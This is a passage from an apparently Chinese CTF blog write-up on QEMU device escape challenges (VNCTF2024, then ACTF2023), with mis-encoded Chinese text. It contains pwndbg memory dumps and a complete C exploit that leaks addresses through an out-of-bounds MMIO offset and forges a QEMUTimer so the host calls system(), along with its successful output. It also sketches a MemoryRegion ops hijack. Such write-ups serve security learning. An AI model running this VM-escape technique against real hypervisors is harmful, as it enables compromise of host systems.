<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_loop_tlg</span><br><span class="line"><span class="variable">$5</span> = (&lt;data variable, no debug info&gt; *) 0x556d37e68480 &lt;main_loop_tlg&gt;</span><br><span class="line">pwndbg&gt; tele 0x556d37e68480</span><br><span class="line">00:0000â”‚  0x556d37e68480 (main_loop_tlg) â€”â–¸ 0x556d3915d7c0 â€”â–¸ 0x556d37e684a0 (qemu_clocks) â€”â–¸ 0x556d3915dc70 â—‚â€” 0x556d37e684a0</span><br><span class="line">01:0008â”‚  0x556d37e68488 (main_loop_tlg+8) â€”â–¸ 0x556d3915d840 â€”â–¸ 0x556d37e684b0 (qemu_clocks+16) â€”â–¸ 0x556d3915dcf0 â—‚â€” 0x556d37e684b0</span><br><span class="line">02:0010â”‚  0x556d37e68490 (main_loop_tlg+16) â€”â–¸ 0x556d3915d8c0 â€”â–¸ 0x556d37e684c0 (qemu_clocks+32) â€”â–¸ 0x556d3915dd70 â—‚â€” 0x556d37e684c0</span><br><span class="line">03:0018â”‚  0x556d37e68498 (main_loop_tlg+24) â€”â–¸ 0x556d3915d940 â€”â–¸ 0x556d37e684d0 (qemu_clocks+48) â€”â–¸ 0x556d3915ddf0 â—‚â€” 0x556d37e684d0</span><br><span class="line">04:0020â”‚  0x556d37e684a0 (qemu_clocks) â€”â–¸ 0x556d3915dc70 â—‚â€” 0x556d37e684a0</span><br><span class="line">05:0028â”‚  0x556d37e684a8 (qemu_clocks+8) â—‚â€” 0x100000000</span><br><span class="line">06:0030â”‚  0x556d37e684b0 (qemu_clocks+16) â€”â–¸ 0x556d3915dcf0 â—‚â€” 0x556d37e684b0</span><br><span class="line">07:0038â”‚  0x556d37e684b8 (qemu_clocks+24) â—‚â€” 0x100000001</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x556d3a13bc30+0xb40-192</span><br><span class="line">00:0000â”‚  0x556d3a13c6b0 â€”â–¸ 0x556d379071e0 (vn_mmio_ops) â€”â–¸ 0x556d36e0a458 (vn_mmio_read) â—‚â€” endbr64</span><br><span class="line">01:0008â”‚  0x556d3a13c6b8 â€”â–¸ 0x556d3a13bc30 â€”â–¸ 0x556d3924d410 â€”â–¸ 0x556d3910b170 â€”â–¸ 0x556d3910b2f0 â—‚â€” ...</span><br><span class="line">02:0010â”‚  0x556d3a13c6c0 â€”â–¸ 0x556d3945c840 â€”â–¸ 0x556d39200d80 â€”â–¸ 0x556d391523c0 â€”â–¸ 0x556d39152540 â—‚â€” ...</span><br><span class="line">03:0018â”‚  0x556d3a13c6c8 â—‚â€” 0x0</span><br><span class="line">04:0020â”‚  0x556d3a13c6d0 â—‚â€” 0x1000</span><br><span class="line">05:0028â”‚  0x556d3a13c6d8 â—‚â€” 0x0</span><br><span class="line">06:0030â”‚  0x556d3a13c6e0 â—‚â€” 0xfebf1000</span><br><span class="line">07:0038â”‚  0x556d3a13c6e8 â€”â–¸ 0x556d371da35b (memory_region_destructor_none) â—‚â€” endbr64</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®mmio_opså¯ä»¥çŸ¥é“å…¶ä¸‹ä¸€ä¸ªå…ƒç´ å°±æ˜¯ opaqueï¼Œä¹Ÿå°±æ˜¯å½“å‰<code>VNState</code>çš„chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MemoryRegion</span> &#123;</span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line">    <span class="comment">/* owner as TYPE_DEVICE. Used for re-entrancy checks in MR access hotpath */</span></span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x556d3a13bc30</span><span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x50</span></span><br><span class="line">size : <span class="number">0xba0</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ä¼ªé€ QEMUTimeräº†ã€‚è°ƒè¯•ï¼ŒæŸ¥çœ‹å†…å­˜ï¼Œå‘ç°<code>main_loop_tlg[1]</code> å­˜åœ¨ <code>active_timer</code>ï¼Œå¯ä»¥ä¿®æ”¹è¿™ä¸ª </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x555c4c77e480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚  <span class="number">0x555c4c77e480</span> (main_loop_tlg) â€”â–¸ <span class="number">0x555c4dfb97c0</span> â€”â–¸ <span class="number">0x555c4c77e4a0</span> (qemu_clocks) â€”â–¸ <span class="number">0x555c4dfb9c70</span> â—‚â€” <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚  <span class="number">0x555c4c77e488</span> (main_loop_tlg+<span class="number">8</span>) â€”â–¸ <span class="number">0x555c4dfb9840</span> â€”â–¸ <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>) â€”â–¸ <span class="number">0x555c4dfb9cf0</span> â—‚â€” <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚  <span class="number">0x555c4c77e490</span> (main_loop_tlg+<span class="number">16</span>) â€”â–¸ <span class="number">0x555c4dfb98c0</span> â€”â–¸ <span class="number">0x555c4c77e4c0</span> (qemu_clocks+<span class="number">32</span>) â€”â–¸ <span class="number">0x555c4dfb9d70</span> â—‚â€” <span class="number">0x555c4c77e4c0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚  <span class="number">0x555c4c77e498</span> (main_loop_tlg+<span class="number">24</span>) â€”â–¸ <span class="number">0x555c4dfb9940</span> â€”â–¸ <span class="number">0x555c4c77e4d0</span> (qemu_clocks+<span class="number">48</span>) â€”â–¸ <span class="number">0x555c4dfb9df0</span> â—‚â€” <span class="number">0x555c4c77e4d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚  <span class="number">0x555c4c77e4a0</span> (qemu_clocks) â€”â–¸ <span class="number">0x555c4dfb9c70</span> â—‚â€” <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚  <span class="number">0x555c4c77e4a8</span> (qemu_clocks+<span class="number">8</span>) â—‚â€” <span class="number">0x100000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚  <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>) â€”â–¸ <span class="number">0x555c4dfb9cf0</span> â—‚â€” <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚  <span class="number">0x555c4c77e4b8</span> (qemu_clocks+<span class="number">24</span>) â—‚â€” <span class="number">0x100000001</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb97c0</span></span><br><span class="line"><span class="number">0x555c4dfb97c0</span>: <span class="number">0x0000555c4c77e4a0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97e0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97f0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9800</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000000004ef98770</span></span><br><span class="line"><span class="number">0x555c4dfb9810</span>: <span class="number">0x0000555c4dfb9cb8</span>      <span class="number">0x0000555c4b8bbeed</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb9840</span></span><br><span class="line"><span class="number">0x555c4dfb9840</span>: <span class="number">0x0000555c4c77e4b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9850</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9860</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9870</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9880</span>: <span class="number">0x0000555c4e28ee30</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9890</span>: <span class="number">0x0000555c4dfb9d38</span>      <span class="number">0x0000555c4b8bbeed</span></span><br></pre></td></tr></table></figure>

<p>expè„šæœ¬</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;complex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,     \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  fprintf(stderr, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;=============\tDEBUG\t=========&quot;</span>);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">mmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">mmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high = <span class="built_in">mmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  <span class="type">uint64_t</span> low = <span class="built_in">mmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_writell</span><span class="params">(<span class="type">uint64_t</span> off, <span class="type">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  low = (off &lt;&lt; <span class="number">32</span>) | (value &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = low;</span><br><span class="line">  high = ((off + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) | (value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  *(<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">0x20</span>) = high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">set_off</span><span class="params">(<span class="type">int32_t</span> off)</span> </span>&#123; <span class="built_in">mmio_writel</span>(<span class="number">0x10</span>, off); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error open resource0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> ret = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> elf_base;</span><br><span class="line">  <span class="type">uint64_t</span> vn_mmio_ops;</span><br><span class="line">  <span class="type">uint64_t</span> main_loop_tlg;</span><br><span class="line">  <span class="type">uint64_t</span> qemu_time_list1;</span><br><span class="line">  <span class="type">uint64_t</span> opaque;</span><br><span class="line">  <span class="type">uint64_t</span> opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> system_fptr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio...&quot;</span>);</span><br><span class="line">  <span class="built_in">mmio_setup</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking elf base...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span>);</span><br><span class="line">  vn_mmio_ops = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  elf_base = vn_mmio_ops - <span class="number">0xf581e0</span>;</span><br><span class="line">  main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;</span><br><span class="line">  system_fptr = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;elf_base : %#lx&quot;</span>, elf_base);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;main_loop_tlg : %#lx&quot;</span>, main_loop_tlg);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;system func : %#lx&quot;</span>, system_fptr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leaking opaque addr...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(<span class="number">-0xC0</span> + <span class="number">8</span>);</span><br><span class="line">  opaque = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  opaque_buf = opaque + <span class="number">0xb40</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque : %#lx&quot;</span>, opaque);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;opaque_buf : %#lx&quot;</span>, opaque_buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak QemuTimerListGroup[1]...&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(main_loop_tlg - opaque_buf + <span class="number">0x8</span>);</span><br><span class="line">  qemu_time_list1 = <span class="built_in">mmio_readll</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;qemu_time_list1 : %#lx&quot;</span>, qemu_time_list1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Make fake QEMUTimer in opaque buf....&quot;</span>);</span><br><span class="line">  <span class="comment">// struct QEMUTimerListGroup &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *tl[QEMU_CLOCK_MAX];</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="comment">// struct QEMUTimerList &#123;</span></span><br><span class="line">  <span class="comment">//   QEMUClock *clock;</span></span><br><span class="line">  <span class="comment">//   QemuMutex active_timers_lock;</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *active_timers;        // 0x48 : change to opaque_buf</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// struct QEMUTimer &#123;</span></span><br><span class="line">  <span class="comment">//   int64_t expire_time;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerList *timer_list;</span></span><br><span class="line">  <span class="comment">//   QEMUTimerCB *cb;                  // 0x10: change to system func ptr</span></span><br><span class="line">  <span class="comment">//   void *opaque;                     // 0x18: change to cmd</span></span><br><span class="line">  <span class="comment">//   QEMUTimer *next;</span></span><br><span class="line">  <span class="comment">//   int attributes;</span></span><br><span class="line">  <span class="comment">//   int scale;</span></span><br><span class="line">  <span class="comment">// &#125;;</span></span><br><span class="line">  <span class="type">uint64_t</span> fake_qemu_timer = opaque_buf;</span><br><span class="line">  <span class="type">uint64_t</span> cmd_ptr = opaque_buf + <span class="number">0x30</span>;</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x8</span>, qemu_time_list1);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x10</span>, system_fptr);</span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x18</span>, cmd_ptr);</span><br><span class="line">  <span class="comment">// &quot;/bin/sh&quot; 0x0068732f6e69622f å¡æ­»</span></span><br><span class="line">  <span class="built_in">mmio_writell</span>(<span class="number">0x30</span>, <span class="number">0x67616c6620746163</span>); <span class="comment">// &quot;cat flag&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Change QemuTimerListGroup[1] to opaque buf&quot;</span>);</span><br><span class="line">  <span class="built_in">set_off</span>(qemu_time_list1 - fake_qemu_timer + <span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_writel</span>(<span class="number">0x30</span>, fake_qemu_timer);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‡½æ•°æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio...</span><br><span class="line">[+] exp.c       Leaking elf base...</span><br><span class="line">[*] exp.c       elf_base : 0x55e4c481e000</span><br><span class="line">[*] exp.c       main_loop_tlg : 0x55e4c5cd7480</span><br><span class="line">[*] exp.c       system func : 0x55e4c4b30040</span><br><span class="line">[+] exp.c       Leaking opaque addr...</span><br><span class="line">[*] exp.c       opaque : 0x55e4c89d3c30</span><br><span class="line">[*] exp.c       opaque_buf : 0x55e4c89d4770</span><br><span class="line">[+] exp.c       Leak QemuTimerListGroup[1]...</span><br><span class="line">[*] exp.c       qemu_time_list1 : 0x55e4c79f5840</span><br><span class="line">[+] exp.c       Make fake QEMUTimer <span class="keyword">in</span> opaque buf....</span><br><span class="line">flag&#123;vnctf2024-test&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit 2"></a>Exploit 2</h3><p>net_bridge_run_helperå‡½æ•°å­˜åœ¨ä¸€ä¸ªexecv(â€œ&#x2F;bin&#x2F;shâ€)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000674291</span>                 lea     rax, [rbp+argv]</span><br><span class="line">.text:<span class="number">0000000000674298</span>                 mov     rsi, rax        ; argv</span><br><span class="line">.text:<span class="number">000000000067429B</span>                 lea     rax, aBinSh_0   ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">00000000006742</span>A2                 mov     rdi, rax        ; path</span><br><span class="line">.text:<span class="number">00000000006742</span>A5                 call    _execv</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹MemoryRegionçš„ç»“æ„ä½“ä¸­çš„opsåŠ«æŒæ§åˆ¶æµğŸ«¢ï¼å¯¹äº MMIO è€Œè¨€read&#x2F;writeæœ€ç»ˆè°ƒç”¨<code>ops-&gt;read()</code> æˆ– <code>ops-&gt;write()</code></p>
<h2 id="ACTF2023-qemu-playground"><a href="#ACTF2023-qemu-playground" class="headerlink" title="ACTF2023 qemu playground"></a>ACTF2023 qemu playground</h2><p>é€†å‘<a href="https://hanqi-blogs.cn/2023/ACTF-2023%20QemuPlayground/">(3)</a> &amp;&amp; PWN</p>
<p>ä¸‹è½½é¢˜ç›®ï¼š<a href="https://github.com/team-s2/ACTF-2023">team-s2&#x2F;ACTF-2023</a></p>
<p>å¯åŠ¨è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 300 ./qemu-system-x86_64 \</span><br><span class="line">    -device actf \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -L ./pc-bios \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null</span><br></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>ä½¿ç”¨IDAæ‰“å¼€ï¼Œ<strong>ç›´æ¥æœç´¢å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰¾åˆ°actf</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.rodata:<span class="number">000000000098B</span>9FB	<span class="number">0000000</span>A	C	actf-mmio</span><br><span class="line">.rodata:<span class="number">000000000098B</span>A05	<span class="number">0000000</span>A	C	actf-pmio</span><br></pre></td></tr></table></figure>

<p>äº¤å‰å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ° realize å‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__fastcall <span class="title">actf_class_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ***objectClass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *devClass; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *pciDevClass; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  devClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                       objectClass,</span><br><span class="line">                       <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;/home/esifiel/qemu/include/hw/qdev-core.h&quot;</span>,</span><br><span class="line">                       <span class="number">0x4D</span>u,</span><br><span class="line">                       <span class="string">&quot;DEVICE_CLASS&quot;</span>);</span><br><span class="line">  pciDevClass = (<span class="type">void</span> *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                          objectClass,</span><br><span class="line">                          <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;/home/esifiel/qemu/include/hw/pci/pci_device.h&quot;</span>,</span><br><span class="line">                          <span class="number">9u</span>,</span><br><span class="line">                          <span class="string">&quot;PCI_DEVICE_CLASS&quot;</span>);</span><br><span class="line">  *((_QWORD *)pciDevClass + <span class="number">22</span>) = pci_actf_realize;</span><br><span class="line">  *((_DWORD *)pciDevClass + <span class="number">52</span>) = <span class="number">0xAC7F1234</span>;   <span class="comment">// classid:vendorid</span></span><br><span class="line">  *((_BYTE *)pciDevClass + <span class="number">212</span>) = <span class="number">0x10</span>;         <span class="comment">// reversion</span></span><br><span class="line">  *((_WORD *)pciDevClass + <span class="number">107</span>) = <span class="number">0xFF</span>;         <span class="comment">// class id</span></span><br><span class="line">  *((_QWORD *)devClass + <span class="number">12</span>) |= <span class="number">0x80</span>uLL;</span><br><span class="line">  <span class="keyword">return</span> pciDevClass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">pci_actf_realize</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// r13</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(object, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  v2 = (__int64)(actfState + <span class="number">336</span>);</span><br><span class="line">  v3 = (__int64)actfState;</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    (__int64)(actfState + <span class="number">336</span>),</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    &amp;mmio_ops,</span><br><span class="line">    (__int64)actfState,</span><br><span class="line">    (__int64)<span class="string">&quot;actf-mmio&quot;</span>,</span><br><span class="line">    <span class="number">4096LL</span>);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>((__int64)object, <span class="number">0</span>, <span class="number">0</span>, v2);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(v3 + <span class="number">2960</span>, v3, &amp;pmio_ops, v3, (__int64)<span 